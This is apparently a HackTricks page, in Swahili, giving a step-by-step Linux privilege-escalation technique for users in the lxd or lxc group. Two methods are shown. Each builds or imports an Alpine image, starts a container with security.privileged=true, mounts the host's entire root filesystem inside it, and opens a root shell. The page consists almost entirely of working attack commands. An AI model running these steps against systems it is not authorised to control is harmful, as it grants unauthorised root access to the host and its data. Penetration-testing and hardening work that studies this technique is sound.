# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Ikiwa uko katika _**lxd**_ **au** _**lxc**_ **group**, unaweza kuwa root

## Exploiting without internet

### Method 1

Unaweza kupakua alpine image ya kutumia pamoja na lxd kutoka kwenye trusted repository.
Canonical huchapisha daily builds kwenye tovuti yao: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Pakua tu **lxd.tar.xz** na **rootfs.squashfs** kutoka kwenye build mpya zaidi. (Jina la directory ni tarehe).

Vinginevyo, unaweza kusakinisha distro builder hii kwenye machine yako: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (fuata instructions za github):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Pakia faili **incus.tar.xz** (**lxd.tar.xz** ikiwa ulipakua kutoka kwenye Canonical repository) na **rootfs.squashfs**, ongeza image kwenye repo na uunde container:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Ukipata hitilafu hii _**Error: No storage pool found. Please create a new storage pool**_\
> Tekeleza **`lxd init`** na uweke chaguo zote kwenye default. Kisha **rudia** sehemu ya awali ya amri

Hatimaye unaweza kutekeleza container na kupata root:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Method 2

Jenga image ya Alpine na ianzishe kwa kutumia flag `security.privileged=true`, ikilazimisha container kuingiliana kama root na filesystem ya host.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
